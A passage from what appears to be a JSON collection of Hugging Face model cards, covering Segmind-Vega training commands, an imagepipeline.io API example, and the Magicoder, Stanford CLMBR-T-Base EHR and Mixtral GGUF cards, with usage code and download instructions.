\\\n--validation_prompt=\"cute dragon creature\" --report_to=\"wandb\" \\\n--push_to_hub\nFine-Tune:\nexport MODEL_NAME=\"segmind/Segmind-Vega\"\nexport VAE_NAME=\"madebyollin/sdxl-vae-fp16-fix\"\nexport DATASET_NAME=\"lambdalabs/pokemon-blip-captions\"\naccelerate launch train_text_to_image_sdxl.py \\\n--pretrained_model_name_or_path=$MODEL_NAME \\\n--pretrained_vae_model_name_or_path=$VAE_NAME \\\n--dataset_name=$DATASET_NAME \\\n--enable_xformers_memory_efficient_attention \\\n--resolution=1024 --center_crop --random_flip \\\n--proportion_empty_prompts=0.2 \\\n--train_batch_size=1 \\\n--gradient_accumulation_steps=4 --gradient_checkpointing \\\n--max_train_steps=10000 \\\n--use_8bit_adam \\\n--learning_rate=1e-06 --lr_scheduler=\"constant\" --lr_warmup_steps=0 \\\n--mixed_precision=\"fp16\" \\\n--report_to=\"wandb\" \\\n--validation_prompt=\"a cute Sundar Pichai creature\" --validation_epochs 5 \\\n--checkpointing_steps=5000 \\\n--output_dir=\"vega-pokemon-model\" \\\n--push_to_hub\nDreambooth LoRA:\nexport MODEL_NAME=\"segmind/Segmind-Vega\"\nexport INSTANCE_DIR=\"dog\"\nexport OUTPUT_DIR=\"lora-trained-vega\"\nexport VAE_PATH=\"madebyollin/sdxl-vae-fp16-fix\"\naccelerate launch train_dreambooth_lora_sdxl.py \\\n--pretrained_model_name_or_path=$MODEL_NAME  \\\n--instance_data_dir=$INSTANCE_DIR \\\n--pretrained_vae_model_name_or_path=$VAE_PATH \\\n--output_dir=$OUTPUT_DIR \\\n--mixed_precision=\"fp16\" \\\n--instance_prompt=\"a photo of sks dog\" \\\n--resolution=1024 \\\n--train_batch_size=1 \\\n--gradient_accumulation_steps=4 \\\n--learning_rate=1e-5 \\\n--report_to=\"wandb\" \\\n--lr_scheduler=\"constant\" \\\n--lr_warmup_steps=0 \\\n--max_train_steps=500 \\\n--validation_prompt=\"A photo of sks dog in a bucket\" \\\n--validation_epochs=25 \\\n--seed=\"0\" \\\n--push_to_hub\nOut-of-Scope Use\nThe Segmind-Vega Model is not suitable for creating factual or accurate representations of people, events, or real-world information. It is not intended for tasks requiring high precision and accuracy.\nLimitations and Bias\nLimitations & Bias:\nThe Segmind-Vega Model faces challenges in achieving absolute photorealism, especially in human depictions. While it may encounter difficulties in incorporating clear text and maintaining the fidelity of complex compositions due to its autoencoding approach, these challenges present opportunities for future enhancements. Importantly, the model's exposure to a diverse dataset, though not a cure-all for ingrained societal and digital biases, represents a foundational step toward more equitable technology. Users are encouraged to interact with this pioneering tool with an understanding of its current limitations, fostering an environment of conscious engagement and anticipation for its continued evolution.\nCitation\n@misc{gupta2024progressive,\ntitle={Progressive Knowledge Distillation Of Stable Diffusion XL Using Layer Level Loss},\nauthor={Yatharth Gupta and Vishnu V. Jaddipal and Harish Prabhala and Sayak Paul and Patrick Von Platen},\nyear={2024},\neprint={2401.02677},\narchivePrefix={arXiv},\nprimaryClass={cs.CV}\n}",
    "imagepipeline/Copax-TimeLessXL-SDXL1.0": "Copax-TimeLessXL-SDXL1.0\nHow to try this model ?\nAPI Reference\nGenerate Image\nFeedback\nğŸ”— Visit Website\nCopax-TimeLessXL-SDXL1.0\nThis checkpoint model is uploaded on imagepipeline.io\nModel details - Steps : 40~60\nCFG : 7~10\nYou can also use hiresfix or After Detailer\nSampling : DPM 3M++ SDE Karass, Euler a or DPM 2M ++ SDE Karass\nNprompt:\n(worst quality, low quality, illustration, 3d, 2d), open mouth, tooth,ugly face, old face, long neck,\nHow to try this model ?\nYou can try using it locally or send an API call to test the output quality.\nGet your API_KEY from  imagepipeline.io. No payment required.\nCoding in php javascript node etc ? Checkout our documentation\nimport requests\nimport json\nurl =  \"https://imagepipeline.io/sdxl/text2image/v1/run\"\npayload = json.dumps({\n\"model_id\":  \"048cfe00-4a93-4d30-84fb-b1abc7a04546\",\n\"prompt\":  \"ultra realistic close up portrait ((beautiful pale cyberpunk female with heavy black eyeliner)), blue eyes, shaved side haircut, hyper detail, cinematic lighting, magic neon, dark red city, Canon EOS R3, nikon, f/1.4, ISO 200, 1/160s, 8K, RAW, unedited, symmetrical balance, in-frame, 8K\",\n\"negative_prompt\":  \"painting, extra fingers, mutated hands, poorly drawn hands, poorly drawn face, deformed, ugly, blurry, bad anatomy, bad proportions, extra limbs, cloned face, skinny, glitchy, double torso, extra arms, extra hands, mangled fingers, missing lips, ugly face, distorted face, extra legs, anime\",\n\"width\":  \"512\",\n\"height\":  \"512\",\n\"samples\":  \"1\",\n\"num_inference_steps\":  \"30\",\n\"safety_checker\":  false,\n\"guidance_scale\":  7.5,\n\"multi_lingual\":  \"no\",\n\"embeddings\":  \"\",\n\"lora_models\": \"\",\n\"lora_weights\":  \"\"\n})\nheaders =  {\n'Content-Type':  'application/json',\n'API-Key': 'your_api_key'\n}\nresponse = requests.request(\"POST\", url, headers=headers, data=payload)\nprint(response.text)\n}\nGet more ready to use MODELS like this for SD 1.5 and SDXL :\nAPI Reference\nGenerate Image\nhttps://api.imagepipeline.io/sdxl/text2image/v1\nHeaders\nType\nDescription\nAPI-Key\nstr\nGet your API_KEY from  imagepipeline.io\nContent-Type\nstr\napplication/json - content type of the request body\nParameter\nType\nDescription\nmodel_id\nstr\nYour base model, find available lists in  models page or upload your own\nprompt\nstr\nText Prompt. Check our Prompt Guide for tips\nnum_inference_steps\nint [1-50]\nNoise is removed with each step, resulting in a higher-quality image over time. Ideal value 30-50 (without LCM)\nguidance_scale\nfloat [1-20]\nHigher guidance scale prioritizes text prompt relevance but sacrifices image quality. Ideal value 7.5-12.5\nlora_models\nstr, array\nPass the model_id(s) of LoRA models that can be found in models page\nlora_weights\nstr, array\nStrength of the LoRA effect\nlicense: creativeml-openrail-m\ntags:\nimagepipeline\nimagepipeline.io\ntext-to-image\nultra-realistic\npinned: false\npipeline_tag: text-to-image\nFeedback\nIf you have any feedback, please reach out to us at hello@imagepipeline.io\nğŸ”— Visit Website\nIf you are the original author of this model, please click here to add credits",
    "ise-uiuc/Magicoder-S-DS-6.7B": "ğŸ© Magicoder: Source Code Is All You Need\nModel Details\nModel Description\nModel Sources\nTraining Data\nUses\nDirect Use\nOut-of-Scope Use\nBias, Risks, and Limitations\nRecommendations\nHow to Get Started with the Model\nTechnical Details\nCitation\nAcknowledgements\nImportant Note\nğŸ© Magicoder: Source Code Is All You Need\nRefer to our GitHub repo ise-uiuc/magicoder for an up-to-date introduction to the Magicoder family!\nğŸ©Magicoder is a model family empowered by ğŸª„OSS-Instruct, a novel approach to enlightening LLMs with open-source code snippets for generating low-bias and high-quality instruction data for code.\nğŸª„OSS-Instruct mitigates the inherent bias of the LLM-synthesized instruction data by empowering them with a wealth of open-source references to produce more diverse, realistic, and controllable data.\nModel Details\nModel Description\nDeveloped by:\nYuxiang Wei,\nZhe Wang,\nJiawei Liu,\nYifeng Ding,\nLingming Zhang\nLicense: DeepSeek\nFinetuned from model: deepseek-coder-6.7b-base\nModel Sources\nRepository: https://github.com/ise-uiuc/magicoder\nPaper: https://arxiv.org/abs/2312.02120\nDemo (powered by Gradio):\nhttps://github.com/ise-uiuc/magicoder/tree/main/demo\nTraining Data\nMagicoder-OSS-Instruct-75K: generated through OSS-Instruct using gpt-3.5-turbo-1106 and used to train both Magicoder and Magicoder-S series.\nMagicoder-Evol-Instruct-110K: decontaminated and redistributed from theblackcat102/evol-codealpaca-v1, used to further finetune Magicoder series and obtain Magicoder-S models.\nUses\nDirect Use\nMagicoders are designed and best suited for coding tasks.\nOut-of-Scope Use\nMagicoders may not work well in non-coding tasks.\nBias, Risks, and Limitations\nMagicoders may sometimes make errors, producing misleading contents, or struggle to manage tasks that are not related to coding.\nRecommendations\nUsers (both direct and downstream) should be made aware of the risks, biases and limitations of the model.\nHow to Get Started with the Model\nUse the code below to get started with the model. Make sure you installed the transformers library.\nfrom transformers import pipeline\nimport torch\nMAGICODER_PROMPT = \"\"\"You are an exceptionally intelligent coding assistant that consistently delivers accurate and reliable responses to user instructions.\n@@ Instruction\n{instruction}\n@@ Response\n\"\"\"\ninstruction = <Your code instruction here>\nprompt = MAGICODER_PROMPT.format(instruction=instruction)\ngenerator = pipeline(\nmodel=\"ise-uiuc/Magicoder-S-DS-6.7B\",\ntask=\"text-generation\",\ntorch_dtype=torch.bfloat16,\ndevice_map=\"auto\",\n)\nresult = generator(prompt, max_length=1024, num_return_sequences=1, temperature=0.0)\nprint(result[0][\"generated_text\"])\nTechnical Details\nRefer to our GitHub repo: ise-uiuc/magicoder.\nCitation\n@misc{magicoder,\ntitle={Magicoder: Source Code Is All You Need},\nauthor={Yuxiang Wei and Zhe Wang and Jiawei Liu and Yifeng Ding and Lingming Zhang},\nyear={2023},\neprint={2312.02120},\narchivePrefix={arXiv},\nprimaryClass={cs.CL}\n}\nAcknowledgements\nWizardCoder: Evol-Instruct\nDeepSeek-Coder: Base model for Magicoder-DS\nCodeLlama: Base model for Magicoder-CL\nStarCoder: Data decontamination\nImportant Note\nMagicoder models are trained on the synthetic data generated by OpenAI models. Please pay attention to OpenAI's terms of use when using the models and the datasets. Magicoders will not compete with OpenAI's commercial products.",
    "beingamit99/car_damage_detection": "",
    "prs-eth/marigold-depth-v1-0": "",
    "LayerNorm/DensePose-TorchScript-with-hint-image": "",
    "OrionZheng/openmoe-base": "",
    "Trelis/Mistral-7B-Instruct-v0.1-Summarize-64k": "",
    "StanfordShahLab/clmbr-t-base": "You need to agree to share your contact information to access this model\nThis repository is publicly accessible, but\nyou have to accept the conditions to access its files and content.\nYou agree to all terms outlined in 'The EHRSHOT Credentialed Health Data License' (see https://shahlab.stanford.edu/ehrshot_license). Access requires a verified CITI training certificate using the same process outlined by PhysioNet (see https://physionet.org/about/citi-course/). Please complete the 'Data or Specimens Only Research' course and please provide proof via the verification URL, which takes the form https://www.citiprogram.org/verify/?XXXXXX. You agree to not use the model to conduct experiments that cause harm to human subjects.\nLog in\nor\nSign Up\nto review the conditions and access this model content.\nCLMBR-T-Base\nModel Details\nModel Description\nModel Sources\nUses\nDirect Use\nOut-of-Scope Use\nBias, Risks, and Limitations\nHow to Get Started with the Model\nTraining Details\nTraining Data\nTraining Procedure\nEvaluation\nTechnical Specifications\nVocabulary\nCitation\nModel Card Authors\nModel Card Contact\nCLMBR-T-Base\nCLMBR-T-Base (CLMBR-Transformer-Base) is a 141 million parameter autoregressive foundation model pretrained on 2.57 million deidentified EHRs from Stanford Medicine.\nThis is the model from (Wornow et al. 2023), and is based on the CLMBR architecture originally described in (Steinberg et al. 2021) with the original GRU replaced with a Transformer.\nAs input, this model expects a sequence of coded medical events that have been mapped to Standard Concepts within the OMOP-CDM vocabulary. The model generates representations of patients which can then be used for downstream prediction tasks.\nInput patients should be provided in the MEDS schema.\nModel Details\nModel Description\nDeveloped by: Shah lab @ Stanford University\nFunded by: Stanford Healthcare\nShared by: Shah lab @ Stanford University\nModel type: CLMBR (Steinberg et al. 2021)\nLanguage(s) (NLP): Electronic health record codes\nLicense: CC-BY NC 4.0\nFinetuned from model: N/A -- trained from scratch\nModel Sources\nWebsite: https://ehrshot.stanford.edu/\nGitub: https://github.com/som-shahlab/ehrshot-benchmark/\nPaper: EHRSHOT: An EHR Benchmark for Few-Shot Evaluation of Foundation Models\nUses\nThis model is intended to generate representations for patients based on the structured data within their electronic health record.\nThese representations can then be used for downstream tasks such as predicting diagnoses, detecting anomalies, or doing propensity score matching for causal inference.\nDirect Use\nYou will likely want to tune the model for your downstream use case.\nOut-of-Scope Use\nThis model is for research purposes only. It is not for use in any real-world decision making that impacts patients, providers, or hospital operations.\nBias, Risks, and Limitations\nThis model was trained on a corpus of 2.57 million patients from Stanford Medicine.\nThe model will thus reflect the patterns of how care is delivered at Stanford Medicine, in addition to the racial and socioeconomic makeup of Stanford Medicine's patient base.\nThis model may not generalize well to other hospitals and demographic mixes.\nWhile this is technically a generative model, we have not tested its generative abilities and thus do not anticipate it being used to generate synthetic EHR records.\nWe aim to explore its generative abilities in future work.\nHow to Get Started with the Model\nUse the code below to get started with the model.\nFirst, download the necessary libraries.\npip install torch==2.1.2 femr==0.2.3 datasets==2.15.0 xformers transformers==4.35.2\nSecond, run the following Python script to run inference on a single patient:\nimport femr.models.transformer\nimport torch\nimport femr.models.tokenizer\nimport femr.models.processor\nimport datetime\nmodel_name = \"StanfordShahLab/clmbr-t-base\"\n# Load tokenizer / batch loader\ntokenizer = femr.models.tokenizer.FEMRTokenizer.from_pretrained(model_name)\nbatch_processor = femr.models.processor.FEMRBatchProcessor(tokenizer)\n# Load model\nmodel = femr.models.transformer.FEMRModel.from_pretrained(model_name)\n# Create an example patient to run inference on\n# This patient follows the MEDS schema: https://github.com/Medical-Event-Data-Standard\nexample_patient = {\n'patient_id': 30,\n'events': [{\n'time': datetime.datetime(2011, 5, 8),\n'measurements': [\n{'code': 'SNOMED/184099003'},\n{'code': 'Visit/IP'},\n],\n},\n{\n'time': datetime.datetime(2012, 6, 9),\n'measurements': [\n{'code': 'Visit/OP'},\n{'code': 'SNOMED/3950001'}\n],\n}]\n}\nraw_batch = batch_processor.convert_patient(example_patient, tensor_type=\"pt\")\nbatch = batch_processor.collate([raw_batch])\n# Run model\nwith torch.no_grad():\n_, result = model(**batch)\nprint(result['timestamps'].cpu().numpy().astype('datetime64[s]'))\nprint(result['patient_ids'])\nprint(result['representations'])\nTraining Details\nFull training details are provided in our accompanying paper, EHRSHOT (Wornow et al. 2023).\nTraining Data\nThe model is trained on 2.57 million patients from the Stanford Medicine Research Data Repository (STARR), which contains EHR data from both Stanford Health Care (primarily adult care)\nand Lucile Packard Childrenâ€™s Hospital (primarily pediatric care).\nThe dataset contains only structured data (i.e. no clinical text or images) and covers demographics (e.g. age, sex, race), diagnoses, procedures, laboratory results, medication prescriptions, and other coded clinical observations.\nThe data is formatted according to the Observational Medical Outcomes Partnership Common Data Model (OMOP-CDM).\nAll data that we work with is deidentified.\nTraining Procedure\nWe train our model using an autoregressive next code prediction objective, i.e. predict the next code in a patient's timeline given their previous codes.\nPreprocessing\nWe use the FEMR Python library for data preprocessing.\nTraining Hyperparameters\nLearning rate: 0.00001\nContext window size: 496\nInternal dropout: 0\nLayers: 12\nHidden dimension: 768\nEvaluation\nWe evaluate this model on the EHRSHOT benchmark.\nInformation on this benchmark, tasks, and results are detailed in Wornow et al. 2023\nTechnical Specifications\nThis model uses the CLMBR architecture from (Steinberg et al. 2021).\nThe objective is an autoregressive next token prediction task.\nPlease see Wornow et al. 2023 for more details on the specific model architecture.\nVocabulary\nCLMBR is a language model and requires defining a token vocabulary V. However, unlike natural languages, the vocabulary of a structured EHR language model is defined by medical codes. Here tokens map to standardized concepts in medical ontologies. Since the union of all tokens from all ontologies, V_all, results in a prohibitively large vocabuary, we derive ~V by filtering to the top k most frequent codes as follows:\nKnowledge Graphs (G): A set of n medical ontologies (knowledge graphs), G = ({G_1, G_2, ..., G_n}), defined by Athena's OMOP Vocabulary List.\nMedical Codes as Tokens: Each knowledge graph G_i has a set of unique medical codes M_i. The union of all these codes serve as the tokens in our complete vocabulary V_all = M_1 âˆª M_2 âˆª ... âˆª M_n. Our final, filtered vocabulary is then ~V = sort_freq(V_all)[1:k] where frequency is calculated over our STARR EHR OMOP dataset.\nCLMBR Vocabulary Summary\n21 Source Ontologies/Knowledge Graphs\n65,536 tokens (the max value of uint16_t)\nPREFIX\nSOURCE\nSIZE\nEXAMPLE TOKENS\nLOINC\nLogical Observation Identifiers Names and Codes (Regenstrief Institute)\n37,590\n31790-9, 20449-5\nSNOMED\nSystematic Nomenclature of Medicine - Clinical Terms (IHTSDO)\n18,174\n105013009, 200755008\nRxNorm\nRxNorm (NLM)\n4,678\n2375327, 372375\nCPT4\nCurrent Procedural Terminology version 4 (AMA)\n3,730\n00790, 36818\nRxNorm Extension\nOMOP RxNorm Extension\n255\nOMOP358911, OMOP2153393\nICD10PCS\nICD-10 Procedure Coding System (CMS)\n233\n10907ZC, 4A0234Z\nICD9Proc\nInternational Classification of Diseases, Ninth Revision, Clinical Modification, Volume 3 (NCHS)\n196\n68.29, 03.93\nCancer Modifier\nDiagnostic Modifiers of Cancer (OMOP)\n88\nc-8th_AJCC/UICC-Stage-2C, p-7th_AJCC/UICC-Stage-3B\nHCPCS\nHealthcare Common Procedure Coding System (CMS)\n54\nC1878, P7001\nICDO3\nInternational Classification of Diseases for Oncology, Third Edition (WHO)\n52\nNULL-C34.8, C56.9\nCVX\nCDC Vaccine Administered CVX (NCIRD)\n41\n151, 158\nDomain\nOMOP\n27\nOMOP generated\nRace\nRace and Ethnicity Code Set (USBC)\n5\n5, 4\nOMOP Extension\nOMOP Extension (OHDSI)\n3\nOMOP5160861, OMOP4912978\nGender\nOMOP Gender\n2\nF, M\nEthnicity\nOMOP Ethnicity\n2\nNot Hispanic, Hispanic\nCMS Place of Service\nPlace of Service Codes for Professional Claims (CMS)\n2\nOMOP4822036, 02\nMedicare Specialty\nMedicare provider/supplier specialty codes (CMS)\n1\nA0\nCondition Type\nOMOP\n1\nOMOP4822053\nCARE_SITE\nSTANFORD_CUSTOM\n396\n7930934, 7929373\nVisit\nSTANFORD_CUSTOM\n6\nERIP, ER\nCitation\nBibTeX:\nPlease cite the following papers if you use CLMBR-T-base in your work.\n@article{wornow2023ehrshot,\ntitle={EHRSHOT: An EHR Benchmark for Few-Shot Evaluation of Foundation Models},\nauthor={Michael Wornow and Rahul Thapa and Ethan Steinberg and Jason Fries and Nigam Shah},\nbooktitle={Thirty-seventh Conference on Neural Information Processing Systems Datasets and Benchmarks Track},\nyear={2023}\n}\n@article{guo2024multi,\ntitle={A multi-center study on the adaptability of a shared foundation model for electronic health records},\nauthor={Guo, Lin Lawrence and Fries, Jason and Steinberg, Ethan and Fleming, Scott Lanyon and Morse, Keith and Aftandilian, Catherine and Posada, Jose and Shah, Nigam and Sung, Lillian},\njournal={NPJ Digital Medicine},\nvolume={7},\nnumber={1},\npages={171},\nyear={2024},\npublisher={Nature Publishing Group UK London}\n}\nModel Card Authors\nMichael Wornow, Ethan Steinberg, Rahul Thapa, Jason Fries, Nigam H. Shah\nModel Card Contact\nMichael Wornow (mwornow@stanford.edu)",
    "sudo-ai/zero123plus-v1.2": "No model card",
    "TheBloke/Mixtral-8x7B-Instruct-v0.1-GGUF": "Mixtral 8X7B Instruct v0.1 - GGUF\nDescription\nAbout GGUF\nMixtral GGUF\nRepositories available\nPrompt template: Mistral\nCompatibility\nExplanation of quantisation methods\nProvided files\nHow to download GGUF files\nIn text-generation-webui\nOn the command line, including multiple files at once\nExample llama.cpp command\nHow to run in text-generation-webui\nHow to run from Python code\nHow to load this model in Python code, using llama-cpp-python\nHow to use with LangChain\nDiscord\nThanks, and how to contribute\nOriginal model card: Mistral AI_'s Mixtral 8X7B Instruct v0.1\nModel Card for Mixtral-8x7B\nWarning\nInstruction format\nRun the model\nIn half-precision\nLower precision using (8-bit & 4-bit) using bitsandbytes\nLoad the model with Flash Attention 2\nLimitations\nThe Mistral AI Team\nChat & support: TheBloke's Discord server\nWant to contribute? TheBloke's Patreon page\nTheBloke's LLM work is generously supported by a grant from andreessen horowitz (a16z)\nMixtral 8X7B Instruct v0.1 - GGUF\nModel creator: Mistral AI_\nOriginal model: Mixtral 8X7B Instruct v0.1\nDescription\nThis repo contains GGUF format model files for Mistral AI_'s Mixtral 8X7B Instruct v0.1.\nAbout GGUF\nGGUF is a new format introduced by the llama.cpp team on August 21st 2023. It is a replacement for GGML, which is no longer supported by llama.cpp.\nMixtral GGUF\nSupport for Mixtral was merged into Llama.cpp on December 13th.\nThese Mixtral GGUFs are known to work in:\nllama.cpp as of December 13th\nKoboldCpp 1.52 as later\nLM Studio 0.2.9 and later\nllama-cpp-python 0.2.23 and later\nOther clients/libraries, not listed above, may not yet work.\nRepositories available\nAWQ model(s) for GPU inference.\nGPTQ models for GPU inference, with multiple quantisation parameter options.\n2, 3, 4, 5, 6 and 8-bit GGUF models for CPU+GPU inference\nMistral AI_'s original unquantised fp16 model in pytorch format, for GPU inference and for further conversions\nPrompt template: Mistral\n[INST] {prompt} [/INST]\nCompatibility\nThese Mixtral GGUFs are compatible with llama.cpp from December 13th onwards. Other clients/libraries may not work yet.\nExplanation of quantisation methods\nClick to see details\nThe new methods available are:\nGGML_TYPE_Q2_K - \"type-1\" 2-bit quantization in super-blocks containing 16 blocks, each block having 16 weight. Block scales and mins are quantized with 4 bits. This ends up effectively using 2.5625 bits per weight (bpw)\nGGML_TYPE_Q3_K - \"type-0\" 3-bit quantization in super-blocks containing 16 blocks, each block having 16 weights. Scales are quantized with 6 bits. This end up using 3.4375 bpw.\nGGML_TYPE_Q4_K - \"type-1\" 4-bit quantization in super-blocks containing 8 blocks, each block having 32 weights. Scales and mins are quantized with 6 bits. This ends up using 4.5 bpw.\nGGML_TYPE_Q5_K - \"type-1\" 5-bit quantization. Same super-block structure as GGML_TYPE_Q4_K resulting in 5.5 bpw\nGGML_TYPE_Q6_K - \"type-0\" 6-bit quantization. Super-blocks with 16 blocks, each block having 16 weights. Scales are quantized with 8 bits. This ends up using 6.5625 bpw\nRefer to the Provided Files table below to see what files use which methods, and how.\nProvided files\nName\nQuant method\nBits\nSize\nMax RAM required\nUse case\nmixtral-8x7b-instruct-v0.1.Q2_K.gguf\nQ2_K\n2\n15.64 GB\n18.14 GB\nsmallest, significant quality loss - not recommended for most purposes\nmixtral-8x7b-instruct-v0.1.Q3_K_M.gguf\nQ3_K_M\n3\n20.36 GB\n22.86 GB\nvery small, high quality loss\nmixtral-8x7b-instruct-v0.1.Q4_0.gguf\nQ4_0\n4\n26.44 GB\n28.94 GB\nlegacy; small, very high quality loss - prefer using Q3_K_M\nmixtral-8x7b-instruct-v0.1.Q4_K_M.gguf\nQ4_K_M\n4\n26.44 GB\n28.94 GB\nmedium, balanced quality - recommended\nmixtral-8x7b-instruct-v0.1.Q5_0.gguf\nQ5_0\n5\n32.23 GB\n34.73 GB\nlegacy; medium, balanced quality - prefer using Q4_K_M\nmixtral-8x7b-instruct-v0.1.Q5_K_M.gguf\nQ5_K_M\n5\n32.23 GB\n34.73 GB\nlarge, very low quality loss - recommended\nmixtral-8x7b-instruct-v0.1.Q6_K.gguf\nQ6_K\n6\n38.38 GB\n40.88 GB\nvery large, extremely low quality loss\nmixtral-8x7b-instruct-v0.1.Q8_0.gguf\nQ8_0\n8\n49.62 GB\n52.12 GB\nvery large, extremely low quality loss - not recommended\nNote: the above RAM figures assume no GPU offloading. If layers are offloaded to the GPU, this will reduce RAM usage and use VRAM instead.\nHow to download GGUF files\nNote for manual downloaders: You almost never want to clone the entire repo! Multiple different quantisation formats are provided, and most users only want to pick and download a single file.\nThe following clients/libraries will automatically download models for you, providing a list of available models to choose from:\nLM Studio\nLoLLMS Web UI\nFaraday.dev\nIn text-generation-webui\nUnder Download Model, you can enter the model repo: TheBloke/Mixtral-8x7B-Instruct-v0.1-GGUF and below it, a specific filename to download, such as: mixtral-8x7b-instruct-v0.1.Q4_K_M.gguf.\nThen click Download.\nOn the command line, including multiple files at once\nI recommend using the huggingface-hub Python library:\npip3 install huggingface-hub\nThen you can download any individual model file to the current directory, at high speed, with a command like this:\nhuggingface-cli download TheBloke/Mixtral-8x7B-Instruct-v0.1-GGUF mixtral-8x7b-instruct-v0.1.Q4_K_M.gguf --local-dir . --local-dir-use-symlinks False\nMore advanced huggingface-cli download usage (click to read)\nYou can also download multiple files at once with a pattern:\nhuggingface-cli download TheBloke/Mixtral-8x7B-Instruct-v0.1-GGUF --local-dir . --local-dir-use-symlinks False --include='*Q4_K*gguf'\nFor more documentation on downloading with huggingface-cli, please see: HF -> Hub Python Library -> Download files -> Download from the CLI.\nTo accelerate downloads on fast connections (1Gbit/s or higher), install hf_transfer:\npip3 install hf_transfer\nAnd set environment variable HF_HUB_ENABLE_HF_TRANSFER to 1:\nHF_HUB_ENABLE_HF_TRANSFER=1 huggingface-cli download TheBloke/Mixtral-8x7B-Instruct-v0.1-GGUF mixtral-8x7b-instruct-v0.1.Q4_K_M.gguf --local-dir . --local-dir-use-symlinks False\nWindows Command Line users: You can set the environment variable by running set HF_HUB_ENABLE_HF_TRANSFER=1 before the download command.\nExample llama.cpp command\nMake sure you are using llama.cpp from commit d0cee0d or later.\n./main -ngl 35 -m mixtral-8x7b-instruct-v0.1.Q4_K_M.gguf --color -c 2048 --temp 0.7 --repeat_penalty 1.1 -n -1 -p \"[INST] {prompt} [/INST]\"\nChange -ngl 32 to the number of layers to offload to GPU. Remove it if you don't have GPU acceleration.\nChange -c 2048 to the desired sequence length. For extended sequence models - eg 8K, 16K, 32K - the necessary RoPE scaling parameters are read from the GGUF file and set by llama.cpp automatically. Note that longer sequence lengths require much more resources, so you may need to reduce this value.\nIf you want to have a chat-style conversation, replace the -p <PROMPT> argument with -i -ins\nFor other parameters and how to use them, please refer to the llama.cpp documentation\nHow to run in text-generation-webui\nNote that text-generation-webui may not yet be compatible with Mixtral GGUFs. Please check compatibility first.\nFurther instructions can be found in the text-generation-webui documentation, here: text-generation-webui/docs/04 â€ Model Tab.md.\nHow to run from Python code\nYou can use GGUF models from Python using the llama-cpp-python version 0.2.23 and later.\nHow to load this model in Python code, using llama-cpp-python\nFor full documentation, please see: llama-cpp-python docs.\nFirst install the package\nRun one of the following commands, according to your system:\n# Base ctransformers with no GPU acceleration\npip install llama-cpp-python\n# With NVidia CUDA acceleration\nCMAKE_ARGS=\"-DLLAMA_CUBLAS=on\" pip install llama-cpp-python\n# Or with OpenBLAS acceleration\nCMAKE_ARGS=\"-DLLAMA_BLAS=ON -DLLAMA_BLAS_VENDOR=OpenBLAS\" pip install llama-cpp-python\n# Or with CLBLast acceleration\nCMAKE_ARGS=\"-DLLAMA_CLBLAST=on\" pip install llama-cpp-python\n# Or with AMD ROCm GPU acceleration (Linux only)\nCMAKE_ARGS=\"-DLLAMA_HIPBLAS=on\" pip install llama-cpp-python\n# Or with Metal GPU acceleration for macOS systems only\nCMAKE_ARGS=\"-DLLAMA_METAL=on\" pip install llama-cpp-python\n# In windows, to set the variables CMAKE_ARGS in PowerShell, follow this format; eg for NVidia CUDA:\n$env:CMAKE_ARGS = \"-DLLAMA_OPENBLAS=on\"\npip install llama-cpp-python\nSimple llama-cpp-python example code\nfrom llama_cpp import Llama\n# Set gpu_layers to the number of layers to offload to GPU. Set to 0 if no GPU acceleration is available on your system.\nllm = Llama(\nmodel_path=\"./mixtral-8x7b-instruct-v0.1.Q4_K_M.gguf\",  # Download the model file first\nn_ctx=2048,  # The max sequence length to use - note that longer sequence lengths require much more resources\nn_threads=8,            # The number of CPU threads to use, tailor to your system and the resulting performance\nn_gpu_layers=35         # The number of layers to offload to GPU, if you have GPU acceleration available\n)\n# Simple inference example\noutput = llm(\n\"[INST] {prompt} [/INST]\", # Prompt\nmax_tokens=512,  # Generate up to 512 tokens\nstop=[\"</s>\"],   # Example stop token - not necessarily correct for this specific model! Please check before using.\necho=True        # Whether to echo the prompt\n)\n# Chat Completion API\nllm = Llama(model_path=\"./mixtral-8x7b-instruct-v0.1.Q4_K_M.gguf\", chat_format=\"llama-2\")  # Set chat_format according to the model you are using\nllm.create_chat_completion(\nmessages = [\n{\"role\": \"system\", \"content\": \"You are a story writing assistant.\"},\n{\n\"role\": \"user\",\n\"content\": \"Write a story about llamas.\"\n}\n]\n)\nHow to use with LangChain\nHere are guides on using llama-cpp-python and ctransformers with LangChain:\nLangChain + llama-cpp-python\nDiscord\nFor further support, and discussions on these models and AI in general, join us at:\nTheBloke AI's Discord server\nThanks, and how to contribute\nThanks to the chirper.ai team!\nThanks to Clay from gpus.llm-utils.org!\nI've had a lot of people ask if they can contribute. I enjoy providing models and helping people, and would love to be able to spend even more time doing it, as well as expanding into new projects like fine tuning/training.\nIf you're able and willing to contribute it will be most gratefully received and will help me to keep providing more models, and to start work on new AI projects.\nDonaters will get priority support on any and all AI/LLM/model questions and requests, access to a private Discord room, plus other benefits.\nPatreon: https://patreon.com/TheBlokeAI\nKo-Fi: https://ko-fi.com/TheBlokeAI\nSpecial thanks to: Aemon Algiz.\nPatreon special mentions: Michael Levine, é˜¿æ˜, Trailburnt, Nikolai Manek, John Detwiler, Randy H, Will Dee, Sebastain Graf, NimbleBox.ai, Eugene Pentland, Emad Mostaque, Ai Maven, Jim Angel, Jeff Scroggin, Michael Davis, Manuel Alberto Morcote, Stephen Murray, Robert, Justin Joy, Luke @flexchar, Brandon Frisco, Elijah Stavena, S_X, Dan Guido, Undi ., Komninos Chatzipapas, Shadi, theTransient, Lone Striker, Raven Klaugh, jjj, Cap'n Zoog, Michel-Marie MAUDET (LINAGORA), Matthew Berman, David, Fen Risland, Omer Bin Jawed, Luke Pendergrass, Kalila, OG, Erik BjÃ¤reholt, Rooh Singh, Joseph William Delisle, Dan Lewis, TL, John Villwock, AzureBlack, Brad, Pedro Madruga, Caitlyn Gatomon, K, jinyuan sun, Mano Prime, Alex, Jeffrey Morgan, Alicia Loh, Illia Dulskyi, Chadd, transmissions 11, fincy, Rainer Wilmers, ReadyPlayerEmma, knownsqashed, Mandus, biorpg, Deo Leter, Brandon Phillips, SuperWojo, Sean Connelly, Iucharbius, Jack West, Harry Royden McLaughlin, Nicholas, terasurfer, Vitor Caleffi, Duane Dunston, Johann-Peter Hartmann, David Ziegler, Olakabola, Ken Nordquist, Trenton Dambrowitz, Tom X Nguyen, Vadim, Ajan Kanaga, Leonard Tan, Clay Pascal, Alexandros Triantafyllidis, JM33133, Xule, vamX, ya boyyy, subjectnull, Talal Aujan, Alps Aficionado, wassieverse, Ari Malik, James Bentley, Woland, Spencer Kim, Michael Dempsey, Fred von Graf, Elle, zynix, William Richards, Stanislav Ovsiannikov, Edmond Seymore, 